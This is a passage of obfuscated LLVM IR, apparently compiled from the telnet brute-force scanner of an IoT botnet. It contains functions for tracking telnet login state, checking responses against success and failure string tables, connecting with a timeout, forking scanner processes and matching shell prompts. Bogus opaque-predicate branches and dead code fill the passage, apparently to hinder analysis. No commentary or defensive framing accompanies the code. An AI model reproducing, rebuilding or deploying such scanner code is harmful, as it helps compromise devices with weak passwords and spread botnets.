  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %74, i32 0, i32 0
  %76 = load i32, i32* %75, align 8
  %77 = call i32 @close(i32 %76)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %44
  %78 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %78, i32 0, i32 7
  store i32 0, i32* %79, align 8
  %80 = load i32, i32* %12, align 4
  %81 = trunc i32 %80 to i8
  %82 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %82, i32 0, i32 2
  store i8 %81, i8* %83, align 8
  %84 = load %struct.telstate_t*, %struct.telstate_t** %11, align 8
  %85 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %84, i32 0, i32 9
  %86 = load i8*, i8** %85, align 8
  call void @llvm.memset.p0i8.i64(i8* %86, i8 0, i64 1024, i32 1, i1 false)
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t*) #0 {
  %2 = alloca %struct.telstate_t*, align 8
  store %struct.telstate_t* %0, %struct.telstate_t** %2, align 8
  %3 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  call void @advance_state(%struct.telstate_t* %3, i32 0)
  %4 = load %struct.telstate_t*, %struct.telstate_t** %2, align 8
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %4, i32 0, i32 3
  store i8 1, i8* %5, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = load i32, i32* @x.57
  %3 = load i32, i32* @y.58
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  store i8* %0, i8** %10, align 8
  %11 = load i8*, i8** %10, align 8
  %12 = call i32 @contains_string(i8* %11, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  %13 = load i32, i32* @x.57
  %14 = load i32, i32* @y.58
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %12

originalBBalteredBB:                              ; preds = %originalBB, %1
  %21 = alloca i8*, align 8
  store i8* %0, i8** %21, align 8
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @contains_string(i8* %22, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i32 0, i32 0))
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = or i64 %22, 2048
  store i64 %23, i64* %15, align 8
  %24 = load i32, i32* %6, align 4
  %25 = load i64, i64* %15, align 8
  %26 = call i32 (i32, i32, ...) @fcntl(i32 %24, i32 4, i64 %25)
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %8, align 4
  %29 = trunc i32 %28 to i16
  %30 = call zeroext i16 @htons(i16 zeroext %29) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i8*, i8** %7, align 8
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %34 = call i32 @getHost(i8* %32, %struct.in_addr* %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %164

; <label>:37:                                     ; preds = %4
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %39 = getelementptr inbounds [8 x i8], [8 x i8]* %38, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 8, i32 4, i1 false)
  %40 = load i32, i32* %6, align 4
  %41 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %42 = call i32 @connect(i32 %40, %struct.sockaddr* %41, i32 16)
  store i32 %42, i32* %16, align 4
  %43 = load i32, i32* %16, align 4
  %44 = icmp slt i32 %43, 0
  br i1 %44, label %45, label %155

; <label>:45:                                     ; preds = %37
  %46 = load i32, i32* @x.61
  %47 = load i32, i32* @y.62
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %45
  %54 = call i32* @__errno_location() #13
  %55 = load i32, i32* %54, align 4
  %56 = icmp eq i32 %55, 115
  %57 = load i32, i32* @x.61
  %58 = load i32, i32* @y.62
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %56, label %65, label %153

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %67, i64* %68, align 8
  %69 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %69, align 8
  br label %70

; <label>:70:                                     ; preds = %65
  %71 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 0
  %73 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %72) #2, !srcloc !4
  %74 = extractvalue { i64, i64* } %73, 0
  %75 = extractvalue { i64, i64* } %73, 1
  %76 = trunc i64 %74 to i32
  store i32 %76, i32* %17, align 4
  %77 = ptrtoint i64* %75 to i64
  %78 = trunc i64 %77 to i32
  store i32 %78, i32* %18, align 4
  br label %79

; <label>:79:                                     ; preds = %70
  %80 = load i32, i32* %6, align 4
  %81 = srem i32 %80, 64
  %82 = zext i32 %81 to i64
  %83 = shl i64 1, %82
  %84 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %85 = load i32, i32* %6, align 4
  %86 = sdiv i32 %85, 64
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %84, i64 0, i64 %87
  %89 = load i64, i64* %88, align 8
  %90 = or i64 %89, %83
  store i64 %90, i64* %88, align 8
  %91 = load i32, i32* %6, align 4
  %92 = add nsw i32 %91, 1
  %93 = call i32 @select(i32 %92, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %94 = icmp sgt i32 %93, 0
  br i1 %94, label %95, label %135

; <label>:95:                                     ; preds = %79
  store i32 4, i32* %13, align 4
  %96 = load i32, i32* %6, align 4
  %97 = bitcast i32* %14 to i8*
  %98 = call i32 @getsockopt(i32 %96, i32 1, i32 4, i8* %97, i32* %13) #2
  %99 = load i32, i32* %14, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %101, label %118

; <label>:101:                                    ; preds = %95
  %102 = load i32, i32* @x.61
  %103 = load i32, i32* @y.62
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %101
  store i32 0, i32* %5, align 4
  %110 = load i32, i32* @x.61
  %111 = load i32, i32* @y.62
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %164

; <label>:118:                                    ; preds = %95
  %119 = load i32, i32* @x.61
  %120 = load i32, i32* @y.62
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %118
  %127 = load i32, i32* @x.61
  %128 = load i32, i32* @y.62
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %136

; <label>:135:                                    ; preds = %79
  store i32 0, i32* %5, align 4
  br label %164

; <label>:136:                                    ; preds = %originalBBpart28
  %137 = load i32, i32* @x.61
  %138 = load i32, i32* @y.62
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %136
  %145 = load i32, i32* @x.61
  %146 = load i32, i32* @y.62
  %147 = sub i32 %145, 1
  %148 = mul i32 %145, %147
  %149 = urem i32 %148, 2
  %150 = icmp eq i32 %149, 0
  %151 = icmp slt i32 %146, 10
  %152 = or i1 %150, %151
  br i1 %152, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %154

; <label>:153:                                    ; preds = %originalBBpart2
  store i32 0, i32* %5, align 4
  br label %164

; <label>:154:                                    ; preds = %originalBBpart212
  br label %155

; <label>:155:                                    ; preds = %154, %37
  %156 = load i32, i32* %6, align 4
  %157 = call i32 (i32, i32, ...) @fcntl(i32 %156, i32 3, i8* null)
  %158 = sext i32 %157 to i64
  store i64 %158, i64* %15, align 8
  %159 = load i64, i64* %15, align 8
  %160 = and i64 %159, -2049
  store i64 %160, i64* %15, align 8
  %161 = load i32, i32* %6, align 4
  %162 = load i64, i64* %15, align 8
  %163 = call i32 (i32, i32, ...) @fcntl(i32 %161, i32 4, i64 %162)
  store i32 1, i32* %5, align 4
  br label %164

; <label>:164:                                    ; preds = %155, %153, %135, %originalBBpart24, %36
  %165 = load i32, i32* %5, align 4
  ret i32 %165

originalBBalteredBB:                              ; preds = %originalBB, %45
  %166 = call i32* @__errno_location() #13
  %167 = load i32, i32* %166, align 4
  %168 = icmp eq i32 %167, 115
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %101
  store i32 0, i32* %5, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %118
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %136
  br label %originalBB10
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = load i32, i32* @x.63
  %2 = load i32, i32* @y.64
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32*, align 8
  %12 = alloca i32, align 4
  %13 = call i32 @fork() #2
  store i32 %13, i32* %10, align 4
  %14 = load i32, i32* %10, align 4
  %15 = icmp ule i32 %14, 0
  %16 = load i32, i32* @x.63
  %17 = load i32, i32* @y.64
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %26

; <label>:24:                                     ; preds = %originalBBpart2
  %25 = load i32, i32* %10, align 4
  store i32 %25, i32* %9, align 4
  br label %79

; <label>:26:                                     ; preds = %originalBBpart2
  %27 = load i32, i32* @x.63
  %28 = load i32, i32* @y.64
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %26
  %35 = load i64, i64* @numpids, align 8
  %36 = add i64 %35, 1
  store i64 %36, i64* @numpids, align 8
  %37 = load i64, i64* @numpids, align 8
  %38 = add i64 %37, 1
  %39 = mul i64 %38, 4
  %40 = call noalias i8* @malloc(i64 %39) #2
  %41 = bitcast i8* %40 to i32*
  store i32* %41, i32** %11, align 8
  store i32 0, i32* %12, align 4
  %42 = load i32, i32* @x.63
  %43 = load i32, i32* @y.64
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart219, label %originalBB1alteredBB

originalBBpart219:                                ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %66, %originalBBpart219
  %51 = load i32, i32* %12, align 4
  %52 = zext i32 %51 to i64
  %53 = load i64, i64* @numpids, align 8
  %54 = sub i64 %53, 1
  %55 = icmp ult i64 %52, %54
  br i1 %55, label %56, label %69

; <label>:56:                                     ; preds = %50
  %57 = load i32*, i32** @pids, align 8
  %58 = load i32, i32* %12, align 4
  %59 = zext i32 %58 to i64
  %60 = getelementptr inbounds i32, i32* %57, i64 %59
  %61 = load i32, i32* %60, align 4
  %62 = load i32*, i32** %11, align 8
  %63 = load i32, i32* %12, align 4
  %64 = zext i32 %63 to i64
  %65 = getelementptr inbounds i32, i32* %62, i64 %64
  store i32 %61, i32* %65, align 4
  br label %66

; <label>:66:                                     ; preds = %56
  %67 = load i32, i32* %12, align 4
  %68 = add i32 %67, 1
  store i32 %68, i32* %12, align 4
  br label %50

; <label>:69:                                     ; preds = %50
  %70 = load i32, i32* %10, align 4
  %71 = load i32*, i32** %11, align 8
  %72 = load i64, i64* @numpids, align 8
  %73 = sub i64 %72, 1
  %74 = getelementptr inbounds i32, i32* %71, i64 %73
  store i32 %70, i32* %74, align 4
  %75 = load i32*, i32** @pids, align 8
  %76 = bitcast i32* %75 to i8*
  call void @free(i8* %76) #2
  %77 = load i32*, i32** %11, align 8
  store i32* %77, i32** @pids, align 8
  %78 = load i32, i32* %10, align 4
  store i32 %78, i32* %9, align 4
  br label %79

; <label>:79:                                     ; preds = %69, %24
  %80 = load i32, i32* %9, align 4
  ret i32 %80

originalBBalteredBB:                              ; preds = %originalBB, %0
  %81 = alloca i32, align 4
  %82 = alloca i32, align 4
  %83 = alloca i32*, align 8
  %84 = alloca i32, align 4
  %85 = call i32 @fork() #2
  store i32 %85, i32* %82, align 4
  %86 = load i32, i32* %82, align 4
  %87 = icmp ule i32 %86, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %26
  %88 = load i64, i64* @numpids, align 8
  %_ = shl i64 %88, 1
  %89 = add i64 %88, 1
  store i64 %89, i64* @numpids, align 8
  %90 = load i64, i64* @numpids, align 8
  %_2 = sub i64 0, %90
  %gen = add i64 %_2, 1
  %_3 = sub i64 %90, 1
  %gen4 = mul i64 %_3, 1
  %_5 = sub i64 %90, 1
  %gen6 = mul i64 %_5, 1
  %_7 = shl i64 %90, 1
  %_8 = shl i64 %90, 1
  %_9 = shl i64 %90, 1
  %_10 = shl i64 %90, 1
  %91 = add i64 %90, 1
  %_11 = shl i64 %91, 4
  %_12 = shl i64 %91, 4
  %_13 = shl i64 %91, 4
  %_14 = sub i64 0, %91
  %gen15 = add i64 %_14, 4
  %_16 = shl i64 %91, 4
  %_17 = shl i64 %91, 4
  %92 = mul i64 %91, 4
  %93 = call noalias i8* @malloc(i64 %92) #2
  %94 = bitcast i8* %93 to i32*
  store i32* %94, i32** %11, align 8
  store i32 0, i32* %12, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = load i32, i32* @x.65
  %3 = load i32, i32* @y.66
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i8* %0, i8** %11, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.135, i32 0, i32 0), i8** %12, align 8
  %16 = load i8*, i8** %11, align 8
  %17 = call i64 @strlen(i8* %16) #10
  %18 = trunc i64 %17 to i32
  store i32 %18, i32* %13, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %14, align 4
  %19 = load i32, i32* @x.65
  %20 = load i32, i32* @y.66
  %21 = sub i32 %19, 1
  %22 = mul i32 %19, %21
  %23 = urem i32 %22, 2
  %24 = icmp eq i32 %23, 0
  %25 = icmp slt i32 %20, 10
  %26 = or i1 %24, %25
  br i1 %26, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %27

; <label>:27:                                     ; preds = %161, %originalBBpart2
  %28 = load i32, i32* %14, align 4
  %29 = sext i32 %28 to i64
  %30 = load i8*, i8** %12, align 8
  %31 = call i64 @strlen(i8* %30) #10
  %32 = icmp ult i64 %29, %31
  br i1 %32, label %33, label %164

; <label>:33:                                     ; preds = %27
  %34 = load i32, i32* @x.65
  %35 = load i32, i32* @y.66
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %33
  %42 = load i32, i32* @x.65
  %43 = load i32, i32* @y.66
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart217, %originalBBpart24
  %51 = load i32, i32* %13, align 4
  %52 = load i32, i32* %15, align 4
  %53 = icmp sgt i32 %51, %52
  br i1 %53, label %54, label %120

; <label>:54:                                     ; preds = %50
  %55 = load i32, i32* @x.65
  %56 = load i32, i32* @y.66
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %54
  %63 = load i8*, i8** %11, align 8
  %64 = load i32, i32* %13, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i32, i32* %15, align 4
  %68 = sext i32 %67 to i64
  %69 = sub i64 0, %68
  %70 = getelementptr inbounds i8, i8* %66, i64 %69
  %71 = load i8, i8* %70, align 1
  %72 = sext i8 %71 to i32
  %73 = icmp eq i32 %72, 0
  %74 = load i32, i32* @x.65
  %75 = load i32, i32* @y.66
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart29, label %originalBB6alteredBB

originalBBpart29:                                 ; preds = %originalBB6
  br i1 %73, label %118, label %82

; <label>:82:                                     ; preds = %originalBBpart29
  %83 = load i8*, i8** %11, align 8
  %84 = load i32, i32* %13, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %83, i64 %85
  %87 = load i32, i32* %15, align 4
  %88 = sext i32 %87 to i64
  %89 = sub i64 0, %88
  %90 = getelementptr inbounds i8, i8* %86, i64 %89
  %91 = load i8, i8* %90, align 1
  %92 = sext i8 %91 to i32
  %93 = icmp eq i32 %92, 32
  br i1 %93, label %118, label %94

; <label>:94:                                     ; preds = %82
  %95 = load i8*, i8** %11, align 8
  %96 = load i32, i32* %13, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i8, i8* %95, i64 %97
  %99 = load i32, i32* %15, align 4
  %100 = sext i32 %99 to i64
  %101 = sub i64 0, %100
  %102 = getelementptr inbounds i8, i8* %98, i64 %101
  %103 = load i8, i8* %102, align 1
  %104 = sext i8 %103 to i32
  %105 = icmp eq i32 %104, 13
  br i1 %105, label %118, label %106

; <label>:106:                                    ; preds = %94
  %107 = load i8*, i8** %11, align 8
  %108 = load i32, i32* %13, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8, i8* %107, i64 %109
  %111 = load i32, i32* %15, align 4
  %112 = sext i32 %111 to i64
  %113 = sub i64 0, %112
  %114 = getelementptr inbounds i8, i8* %110, i64 %113
  %115 = load i8, i8* %114, align 1
  %116 = sext i8 %115 to i32
  %117 = icmp eq i32 %116, 10
  br label %118

; <label>:118:                                    ; preds = %106, %94, %82, %originalBBpart29
  %119 = phi i1 [ true, %94 ], [ true, %82 ], [ true, %originalBBpart29 ], [ %117, %106 ]
  br label %120

; <label>:120:                                    ; preds = %118, %50
  %121 = phi i1 [ false, %50 ], [ %119, %118 ]
  br i1 %121, label %122, label %141

; <label>:122:                                    ; preds = %120
  %123 = load i32, i32* @x.65
  %124 = load i32, i32* @y.66
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %122
  %131 = load i32, i32* %15, align 4
  %132 = add nsw i32 %131, 1
  store i32 %132, i32* %15, align 4
  %133 = load i32, i32* @x.65
  %134 = load i32, i32* @y.66
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart217, label %originalBB11alteredBB

originalBBpart217:                                ; preds = %originalBB11
  br label %50

; <label>:141:                                    ; preds = %120
  %142 = load i8*, i8** %11, align 8
  %143 = load i32, i32* %13, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds i8, i8* %142, i64 %144
  %146 = load i32, i32* %15, align 4
  %147 = sext i32 %146 to i64
  %148 = sub i64 0, %147
  %149 = getelementptr inbounds i8, i8* %145, i64 %148
  %150 = load i8, i8* %149, align 1
  %151 = sext i8 %150 to i32
  %152 = load i8*, i8** %12, align 8
  %153 = load i32, i32* %14, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds i8, i8* %152, i64 %154
  %156 = load i8, i8* %155, align 1
  %157 = sext i8 %156 to i32
  %158 = icmp eq i32 %151, %157
  br i1 %158, label %159, label %160

; <label>:159:                                    ; preds = %141
  store i32 1, i32* %10, align 4
  br label %165

; <label>:160:                                    ; preds = %141
  br label %161

; <label>:161:                                    ; preds = %160
  %162 = load i32, i32* %14, align 4
  %163 = add nsw i32 %162, 1
  store i32 %163, i32* %14, align 4
  br label %27

; <label>:164:                                    ; preds = %27
  store i32 0, i32* %10, align 4
  br label %165

; <label>:165:                                    ; preds = %164, %159
  %166 = load i32, i32* @x.65
  %167 = load i32, i32* @y.66
  %168 = sub i32 %166, 1
  %169 = mul i32 %166, %168
  %170 = urem i32 %169, 2
  %171 = icmp eq i32 %170, 0
  %172 = icmp slt i32 %167, 10
  %173 = or i1 %171, %172
  br i1 %173, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %165
  %174 = load i32, i32* %10, align 4
  %175 = load i32, i32* @x.65
  %176 = load i32, i32* @y.66
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  ret i32 %174

originalBBalteredBB:                              ; preds = %originalBB, %1
  %183 = alloca i32, align 4
  %184 = alloca i8*, align 8
  %185 = alloca i8*, align 8
  %186 = alloca i32, align 4
  %187 = alloca i32, align 4
  %188 = alloca i32, align 4
  store i8* %0, i8** %184, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.135, i32 0, i32 0), i8** %185, align 8
  %189 = load i8*, i8** %184, align 8
  %190 = call i64 @strlen(i8* %189) #10
  %191 = trunc i64 %190 to i32
  store i32 %191, i32* %186, align 4
  store i32 0, i32* %188, align 4
  store i32 0, i32* %187, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %33
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %54
  %192 = load i8*, i8** %11, align 8
  %193 = load i32, i32* %13, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds i8, i8* %192, i64 %194
  %196 = load i32, i32* %15, align 4
  %197 = sext i32 %196 to i64
  %_ = sub i64 0, 0
  %gen = add i64 %_, %197
  %_7 = shl i64 0, %197
  %198 = sub i64 0, %197
  %199 = getelementptr inbounds i8, i8* %195, i64 %198
  %200 = load i8, i8* %199, align 1
  %201 = sext i8 %200 to i32
  %202 = icmp eq i32 %201, 0
  br label %originalBB6

originalBB11alteredBB:                            ; preds = %originalBB11, %122
  %203 = load i32, i32* %15, align 4
  %_12 = sub i32 0, %203
  %gen13 = add i32 %_12, 1
  %_14 = sub i32 0, %203
  %gen15 = add i32 %_14, 1
  %204 = add nsw i32 %203, 1
  store i32 %204, i32* %15, align 4
  br label %originalBB11

originalBB19alteredBB:                            ; preds = %originalBB19, %165
  %205 = load i32, i32* %10, align 4
  br label %originalBB19
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
